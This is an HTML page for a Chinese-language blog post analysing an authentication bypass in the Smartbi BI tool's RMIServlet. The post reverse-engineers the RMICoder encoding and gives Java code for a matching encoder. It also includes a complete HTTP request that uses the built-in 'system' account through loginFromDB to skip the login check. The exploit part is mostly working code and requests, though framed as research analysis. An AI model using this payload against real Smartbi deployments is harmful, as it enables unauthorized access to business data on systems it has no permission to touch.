@@ -1,0 +1,781 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Yuanyi">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="​       Smartbi是一款国内领先的商业智能可视化报表工具，它可以将数据转化为图表、图像、表格等形式，帮助企业快速发现数据背后的价值，优化决策，提高业务效率。在众多可视化报表工具中，Smartbi以高效、易用、灵活等特点著称。 ​       在对目标站点发起请求时，后台会判断我们的请求路径是否为：&quot;&#x2F;vision&#x2F;RMIServlet&quot;，如果路径正确才会接收对应的参">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Smartbi内置用户绕过浅析">
+<meta property="og:url" content="http://example.com/2023/07/21/Smartbi%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/index.html">
+<meta property="og:site_name" content="Myloveguoguo">
+<meta property="og:description" content="​       Smartbi是一款国内领先的商业智能可视化报表工具，它可以将数据转化为图表、图像、表格等形式，帮助企业快速发现数据背后的价值，优化决策，提高业务效率。在众多可视化报表工具中，Smartbi以高效、易用、灵活等特点著称。 ​       在对目标站点发起请求时，后台会判断我们的请求路径是否为：&quot;&#x2F;vision&#x2F;RMIServlet&quot;，如果路径正确才会接收对应的参">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ice.frostsky.com/2023/08/15/5e4ad34a2a514cd6344809c2c6cf8f77.png">
+<meta property="og:image" content="https://ice.frostsky.com/2023/08/15/5152b017abe11bafdb1029775821fc0f.png">
+<meta property="og:image" content="https://ice.frostsky.com/2023/08/15/c32ef627aabd3ffa43a2dd36a1a6d388.png">
+<meta property="og:image" content="https://ice.frostsky.com/2023/08/15/9c2568fe8547f55d8318d2afc7317cfb.png">
+<meta property="og:image" content="https://ice.frostsky.com/2023/08/15/bc592e6c68e6d670897d027bd8b3be37.png">
+<meta property="og:image" content="https://ice.frostsky.com/2023/08/15/5434c63bcc9232c97370989436277eb0.png">
+<meta property="og:image" content="https://ice.frostsky.com/2023/08/15/30a7e8ef0681ec62d46cb1a58e8bf39e.png">
+<meta property="og:image" content="https://ice.frostsky.com/2023/08/15/da12392b4ac79376c73da6f8b82c6fa5.png">
+<meta property="og:image" content="https://ice.frostsky.com/2023/08/15/da12392b4ac79376c73da6f8b82c6fa5.png">
+<meta property="og:image" content="https://ice.frostsky.com/2023/08/15/09dc2408629a1e3c90c1d91f53543788.png">
+<meta property="og:image" content="https://ice.frostsky.com/2023/08/15/36bb69fb62eb7d6c83e26b16cff0d3ce.png">
+<meta property="og:image" content="https://ice.frostsky.com/2023/08/15/6f059f4cbea86b95a603045f81e21e7e.md.png">
+<meta property="og:image" content="https://ice.frostsky.com/2023/08/15/68fe5752b51f9481255ee7705e53e6fb.png">
+<meta property="og:image" content="https://ice.frostsky.com/2023/08/15/c27882fe048ddfbbbcea101baf5b478d.png">
+<meta property="og:image" content="https://ice.frostsky.com/2023/08/15/8a25d1b1fa4f397f9a1590ef59962264.png">
+<meta property="og:image" content="https://ice.frostsky.com/2023/08/15/3f3de12e65e7172678f06dce83f0c7f0.png">
+<meta property="article:published_time" content="2023-07-21T13:35:37.000Z">
+<meta property="article:modified_time" content="2023-08-15T11:29:06.070Z">
+<meta property="article:author" content="Yuanyi">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ice.frostsky.com/2023/08/15/5e4ad34a2a514cd6344809c2c6cf8f77.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Smartbi内置用户绕过浅析 - Myloveguoguo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/shubiao.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Myloveguoguo</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Smartbi内置用户绕过浅析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-07-21 21:35" pubdate>
+          2023年7月21日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          58 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Smartbi内置用户绕过浅析</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>​       Smartbi是一款国内领先的商业智能可视化报表工具，它可以将数据转化为图表、图像、表格等形式，帮助企业快速发现数据背后的价值，优化决策，提高业务效率。在众多可视化报表工具中，Smartbi以高效、易用、灵活等特点著称。</p>
+<p>​       在对目标站点发起请求时，后台会判断我们的请求路径是否为：<code>&quot;/vision/RMIServlet&quot;</code>，如果路径正确才会接收对应的参数，若路径不正确则不会接收。</p>
+<p>​       他一共有<strong>三种</strong>接收参数的方式</p>
+<p>​       <strong>第一种</strong>是如下图用<code>windowUnloading</code>的方式传入，接收以后先进行<code>URLDecode</code>再用内置的<code>RMICoder.decode()</code>进行解码，之后分别赋值给<code>className</code>、<code>methodName</code>和<code>params</code>。</p>
+<p><img src="https://ice.frostsky.com/2023/08/15/5e4ad34a2a514cd6344809c2c6cf8f77.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p>​       <strong>第二种</strong>接收参数的方式是直接用POST传入，先接收<code>className</code>和<code>methodName</code>两个变量，最后在doPost中接收<code>params</code>。</p>
+<p><img src="https://ice.frostsky.com/2023/08/15/5152b017abe11bafdb1029775821fc0f.png" srcset="/img/loading.gif" lazyload alt="2"></p>
+<p>​       <strong>第三种</strong>接收参数的方式是用<code>encode</code>传入这种传入方式和第一种的<code>windowUnloading</code>有许多相似之处。</p>
+<p><img src="https://ice.frostsky.com/2023/08/15/c32ef627aabd3ffa43a2dd36a1a6d388.png" srcset="/img/loading.gif" lazyload alt="3"></p>
+<p>​       看了接收参数的方式之后，我们来分析一下他们产生漏洞的原因。我们着重讲解第一种以<code>windowUnloading</code>方式传入。因为他们只是传参方式不同，到最后利用点都是一样的。</p>
+<p><img src="https://ice.frostsky.com/2023/08/15/9c2568fe8547f55d8318d2afc7317cfb.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>​       通过上面的代码可以看到用<code>windowUnloading</code>接收到参数后会将<code>content</code>进行<code>RMICoder.decode()</code>其实最重要的也就是这一步，因为这一步会将我们输入的参数进行解码，那我们要传入参数的话必须得知道他是如何进行编码（顺带提一嘴，<code>RMICoder.decode()</code>和<code>RMICoder.encode()</code>方法是不对称的，所以没办法直接进行还原）所以我们深入一下<code>RMICoder.decode()</code>。</p>
+<p><img src="https://ice.frostsky.com/2023/08/15/bc592e6c68e6d670897d027bd8b3be37.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>​       再看一下<code>CodeHandler.enCode()</code>和<code>CodeHandler.deCode()</code>，除了上面<strong>存</strong>和<strong>取</strong>的方式不同，暂时还是没有明显区别。</p>
+<p><img src="https://ice.frostsky.com/2023/08/15/5434c63bcc9232c97370989436277eb0.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>​       再往里面进<code>getSystemCoder()</code>：</p>
+<p><img src="https://ice.frostsky.com/2023/08/15/30a7e8ef0681ec62d46cb1a58e8bf39e.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>​       这段代码是一个静态方法，用于获取系统编码器（ICoder对象）。</p>
+<p>​       首先，定义了一个字符串变量algorithName，并将其初始化为null。</p>
+<p>​       然后，在try块中，通过<code>VirtualDatabaseUtil.getSystemConfigValue(&quot;NETWORK_TRANSNISSION_ALGORITHM&quot;)</code>方法获取系统配置值，转换为字符串，并将结果赋值给algorithName。如果在获取配置值的过程中发生异常，则将异常记录到日志中，并将algorithName重新赋值为null。</p>
+<p>​       接下来，使用<code>StringUtil.isNullOrEmpty(algorithName)</code>方法判断algorithName是否为空或者空字符串。如果是，则调用<code>CommonUtil.getNetWorkAlgorithmByJDBC()</code>方法获取网络算法名称，并将结果赋值给algorithName。再次判断algorithName是否为空或者空字符串。如果是，则将algorithName设置为默认值”SF1″。</p>
+<p>​       然后，通过<code>codersMap.get(algorithName)</code>方法从codersMap中获取对应的ICoder对象，并将结果赋值给变量coder。</p>
+<p>​       接着判断coder是否为空。如果为空，则记录错误日志，并将algorithName重新设置为默认值”SF1″。然后再次通过<code>codersMap.get(algorithName)</code>方法从codersMap中获取对应的ICoder对象，并将结果赋值给coder。</p>
+<p>​       最后，返回coder作为结果。</p>
+<p>​       所以我们可以根据上面的加密方式构造一个对称的encode加密方式：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.google.common.primitives.Bytes;<br><span class="hljs-keyword">import</span> smartbi.util.codeutil.CodeHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">t</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] encodeArray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">47</span>, <span class="hljs-number">0</span>, <span class="hljs-number">56</span>, <span class="hljs-number">97</span>, <span class="hljs-number">89</span>, <span class="hljs-number">84</span>, <span class="hljs-number">43</span>, <span class="hljs-number">0</span>, <span class="hljs-number">103</span>, <span class="hljs-number">106</span>, <span class="hljs-number">37</span>, <span class="hljs-number">113</span>, <span class="hljs-number">49</span>, <span class="hljs-number">121</span>, <span class="hljs-number">78</span>, <span class="hljs-number">114</span>, <span class="hljs-number">112</span>, <span class="hljs-number">110</span>, <span class="hljs-number">48</span>, <span class="hljs-number">76</span>, <span class="hljs-number">55</span>, <span class="hljs-number">123</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">40</span>, <span class="hljs-number">88</span>, <span class="hljs-number">120</span>, <span class="hljs-number">115</span>, <span class="hljs-number">41</span>, <span class="hljs-number">77</span>, <span class="hljs-number">107</span>, <span class="hljs-number">71</span>, <span class="hljs-number">104</span>, <span class="hljs-number">53</span>, <span class="hljs-number">52</span>, <span class="hljs-number">80</span>, <span class="hljs-number">54</span>, <span class="hljs-number">51</span>, <span class="hljs-number">65</span>, <span class="hljs-number">33</span>, <span class="hljs-number">117</span>, <span class="hljs-number">105</span>, <span class="hljs-number">108</span>, <span class="hljs-number">68</span>, <span class="hljs-number">90</span>, <span class="hljs-number">66</span>, <span class="hljs-number">83</span>, <span class="hljs-number">122</span>, <span class="hljs-number">81</span>, <span class="hljs-number">86</span>, <span class="hljs-number">93</span>, <span class="hljs-number">0</span>, <span class="hljs-number">91</span>, <span class="hljs-number">0</span>, <span class="hljs-number">102</span>, <span class="hljs-number">0</span>, <span class="hljs-number">69</span>, <span class="hljs-number">119</span>, <span class="hljs-number">73</span>, <span class="hljs-number">109</span>, <span class="hljs-number">126</span>, <span class="hljs-number">45</span>, <span class="hljs-number">118</span>, <span class="hljs-number">100</span>, <span class="hljs-number">99</span>, <span class="hljs-number">82</span>, <span class="hljs-number">116</span>, <span class="hljs-number">75</span>, <span class="hljs-number">57</span>, <span class="hljs-number">39</span>, <span class="hljs-number">79</span>, <span class="hljs-number">101</span>, <span class="hljs-number">46</span>, <span class="hljs-number">72</span>, <span class="hljs-number">42</span>, <span class="hljs-number">67</span>, <span class="hljs-number">50</span>, <span class="hljs-number">74</span>, <span class="hljs-number">111</span>, <span class="hljs-number">70</span>, <span class="hljs-number">95</span>, <span class="hljs-number">85</span>, <span class="hljs-number">58</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">98</span>, <span class="hljs-number">0</span>&#125;;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">byte</span>[] ret =  <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[encodeArray.length];<br>        <span class="hljs-keyword">for</span> ( <span class="hljs-type">byte</span> i: encodeArray)&#123;<br>            <span class="hljs-keyword">if</span> (i&gt;<span class="hljs-number">0</span>)&#123;<br>                ret[i] = (<span class="hljs-type">byte</span>)Bytes.indexOf(encodeArray,i);<br>            &#125;<br>        &#125;<br>        encodeArray = ret;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] encode(<span class="hljs-type">byte</span>[] dataByte) &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; dataByte.length; ++j) &#123;<br>            <span class="hljs-type">byte</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> dataByte[i];<br>            <span class="hljs-keyword">if</span> (tmp != <span class="hljs-number">0</span> &amp;&amp; tmp &lt; encodeArray.length) &#123;<br>                <span class="hljs-type">byte</span> <span class="hljs-variable">decodeChar</span> <span class="hljs-operator">=</span> encodeArray[tmp];<br>                <span class="hljs-keyword">if</span> (decodeChar != <span class="hljs-number">0</span>) &#123;<br>                    dataByte[i] = decodeChar;<br>                &#125;<br>            &#125;<br><br>            ++i;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> dataByte;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        test();<br>        <span class="hljs-type">byte</span>[] dataByte = CodeHandler.strToByteArrayByUTF8(<span class="hljs-string">&quot;%5B%22system%22%2C%220a%22%5D&quot;</span>);<br>        dataByte = encode(dataByte);<br><br>        System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span> (dataByte));<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>​       这样一来，我们用自定义的encode方法加密出来的数据和内置的decode方法解密出来的数据就是对称的了。</p>
+<p><img src="https://ice.frostsky.com/2023/08/15/da12392b4ac79376c73da6f8b82c6fa5.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>​       通过上面的代码我们可以看到内部接收三个参数<code>className</code>、<code>methodName</code>和<code>params</code>而且必须通过参数<code>windowUnloading</code>这个参数进行传入，传入之后会对其进行解码。</p>
+<p><code>className</code>： UserService</p>
+<p><code>methodName</code>：loginFromDB</p>
+<p><code>params</code>：[“system”,”0a”]</p>
+<p>​       所以我们只需要将我们传入的参数按顺序进行自定义编码进行传入即可。故构造如下payload：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet?windowUnloading=zDp4Wp4gRip+Sw-R6x4wdTV+/JV/uuD2Dkpd/uu/ut/uu7(/uu/JT</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.65.14.247:18080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.65.14.247:18080/smartbi/vision/index.jsp<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.65.14.247:18080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>FQPassword=; JSESSIONID=5A8FD28B6C3E7FABBC20B8C8C67C77C3<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>3<br><br><span class="language-abnf"><span class="hljs-attribute">a</span><span class="hljs-operator">=</span><span class="hljs-number">0</span></span><br></code></pre></td></tr></table></figure>
+
+<p>​       看到这里可能有人会问，你都已经通过GET方式传入<code>windowUnloading</code>了为什么要把包变成POST？我们可以先带着问题往下看。</p>
+<p>​       在接收到参数后程序会来到鉴权这一步，来判断我们是否已经登录，所以会跳到这个<code>needToCheck()</code>方法中：</p>
+<p><img src="https://ice.frostsky.com/2023/08/15/da12392b4ac79376c73da6f8b82c6fa5.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>​       那我们再跟进一下这个<code>needToCheck()</code>：</p>
+<p><img src="https://ice.frostsky.com/2023/08/15/09dc2408629a1e3c90c1d91f53543788.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>​       可以看到这个<code>needToCheck()</code>内部是对白名单的检验，一旦参数符合要求就返回false，那么我们就不会进入到上面的再次验证是否登录的操作。</p>
+<p>​      因为我们是以POST的方式提交的数据，所以我们会来到<code>doPost</code>：</p>
+<p><img src="https://ice.frostsky.com/2023/08/15/36bb69fb62eb7d6c83e26b16cff0d3ce.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>​       之后会将我们提交的<code>params</code>里面的值会接收传入<code>loginFromDB()</code>，若登录成功则会返回<strong>loginSucceed</strong></p>
+<p><img src="https://ice.frostsky.com/2023/08/15/6f059f4cbea86b95a603045f81e21e7e.md.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>​       所以我们也就清楚了漏洞的成因，先进行白名单检验绕过，然后通过<code>params</code>里面传入的两个值分别是内置用户的账号和密码进行登录。</p>
+<p>​       </p>
+<p>​       在这之前还有一个问题，为什么数据要通过POST传入？</p>
+<p>​       我们可以构造如下请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/smartbi/vision/RMIServlet?windowUnloading=zDp4Wp4gRip+Sw-R6x4wdTV+/JV/uuD2Dkpd/uu/ut/uu7(/uu/JT</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.65.14.247:18080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.65.14.247:18080/smartbi/vision/index.jsp<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.65.14.247:18080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>FQPassword=; JSESSIONID=5A8FD28B6C3E7FABBC20B8C8C67C77C3<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br></code></pre></td></tr></table></figure>
+
+<p>​       之前的流程都是大差不差的，他虽然也会绕过之前的<code>needToCheck()</code>，但是GET请求会来到<code>doGet</code>里面：</p>
+<p><img src="https://ice.frostsky.com/2023/08/15/68fe5752b51f9481255ee7705e53e6fb.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>​       <code>doGet</code>很简单，首先判断请求路径是否以**.js.stub<strong>结尾如果不是则会报</strong>Invalid URL**</p>
+<p>​       就算我们可以想办法绕过这一步，他后面也只接收一个参数<code>className</code>所以根本达不到利用的效果，这也就是我们为什么要用POST而不用GET的原因了。至于POST的数据可以随意构造。</p>
